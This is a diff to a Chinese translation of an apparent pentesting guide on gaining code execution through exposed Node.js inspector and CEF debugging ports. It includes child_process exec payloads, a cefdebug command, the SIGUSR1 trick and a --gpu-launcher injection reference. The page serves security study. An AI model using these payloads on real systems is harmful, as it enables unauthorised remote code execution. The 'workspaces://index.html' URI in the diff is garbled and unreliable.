@@ -9,7 +9,7 @@
 调试客户端必须知道并指定主机地址、端口和 UUID 以进行连接。完整的 URL 看起来像 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。
 
 > [!WARNING]
-> 由于 **调试器对 Node.js 执行环境具有完全访问权限**，能够连接到此端口的恶意行为者可能能够代表 Node.js 进程执行任意代码（**潜在的特权提升**）。
+> 由于 **调试器对 Node.js 执行环境具有完全访问权限**，能够连接到此端口的恶意行为者可能能够代表 Node.js 进程执行任意代码（**潜在的权限提升**）。
 
 启动调试器有几种方法：
 ```bash
@@ -27,7 +27,7 @@ node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
-基于 **CEF** (**Chromium Embedded Framework**) 的进程需要使用参数: `--remote-debugging-port=9222` 来打开 **debugger**（SSRF 保护仍然非常相似）。然而，它们 **而不是** 授予 **NodeJS** **debug** 会话，而是使用 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 与浏览器进行通信，这是一个控制浏览器的接口，但没有直接的 RCE。
+基于 **CEF** (**Chromium Embedded Framework**) 的进程需要使用参数: `--remote-debugging-port=9222` 来打开 **debugger**（SSRF 保护仍然非常相似）。然而，它们 **而不是** 授予 **NodeJS** **debug** 会话，而是通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 与浏览器进行通信，这是一个控制浏览器的接口，但没有直接的 RCE。
 
 当你启动一个调试的浏览器时，类似这样的内容将会出现：
 ```
@@ -40,9 +40,9 @@ DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4
 > [!NOTE]
 > 该**安全措施防止利用检查器**通过**仅发送 HTTP 请求**（这可以通过利用 SSRF 漏洞来完成）来运行代码。
 
-### 在运行进程中启动检查器
+### 在运行的进程中启动检查器
 
-您可以向正在运行的 nodejs 进程发送**信号 SIGUSR1**以使其在默认端口**启动检查器**。但是，请注意，您需要拥有足够的权限，因此这可能会授予您**对进程内部信息的特权访问**，但不会直接导致权限提升。
+您可以向正在运行的 nodejs 进程发送**信号 SIGUSR1**以使其在默认端口**启动检查器**。但是，请注意，您需要拥有足够的权限，因此这可能会授予您**对进程内部信息的特权访问**，但不会直接提升权限。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -73,14 +73,14 @@ debug> exec("process.mainModule.require('child_process').exec('/Applications/iTe
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 > [!NOTE]
-> 请注意，**NodeJS RCE 漏洞将无法工作**，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器（您需要检查 API 以找到有趣的事情来做）。
+> 请注意，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器，**NodeJS RCE 漏洞将无法工作**（您需要检查 API 以找到有趣的操作）。
 
 ## NodeJS 调试器/检查器中的 RCE
 
 > [!NOTE]
-> 如果您来这里是想了解如何从 Electron 中的 [**XSS 获取 RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
+> 如果您来这里是想了解如何从 Electron 中的 [**XSS 获取 RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)
 
-一些常见的方法来获得 **RCE** 当您可以 **连接** 到 Node **检查器** 时是使用类似的东西（看起来这 **在连接到 Chrome DevTools 协议时将无法工作**）：
+一些常见的方法来获取 **RCE** 当您可以 **连接** 到 Node **检查器** 时是使用类似的东西（看起来这 **在连接到 Chrome DevTools 协议时不会工作**）：
 ```javascript
 process.mainModule.require("child_process").exec("calc")
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -89,14 +89,14 @@ Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
 ```
 ## Chrome DevTools Protocol Payloads
 
-您可以在此处查看 API: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
+您可以在这里查看 API: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
 在本节中，我将列出我发现人们用来利用此协议的有趣内容。
 
 ### 通过深层链接进行参数注入
 
-在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino 安全发现基于 CEF 的应用程序 **在系统中注册了一个自定义 URI** (workspaces://)，该 URI 接收完整的 URI，然后 **使用部分构造的配置启动 CEF 基于的应用程序**。
+在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino 安全发现基于 CEF 的应用程序 **在系统中注册了一个自定义 URI** (workspaces://index.html)，该 URI 接收完整的 URI，然后 **使用部分构造的配置启动 CEF 基于的应用程序**。
 
-发现 URI 参数被 URL 解码并用于启动 CEF 基本应用程序，允许用户在 **命令行** 中 **注入** 标志 **`--gpu-launcher`** 并执行任意操作。
+发现 URI 参数被 URL 解码并用于启动 CEF 基本应用程序，允许用户 **注入** 标志 **`--gpu-launcher`** 到 **命令行** 并执行任意操作。
 
 因此，像这样的有效载荷:
 ```
@@ -122,7 +122,7 @@ downloadPath: "/code/",
 ```
 ### Webdriver RCE 和外泄
 
-根据这篇文章：[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)，可以获得 RCE 并从 theriver 中外泄内部页面。
+根据这篇文章: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)，可以获得 RCE 并从 theriver 中外泄内部页面。
 
 ### 后期利用
 
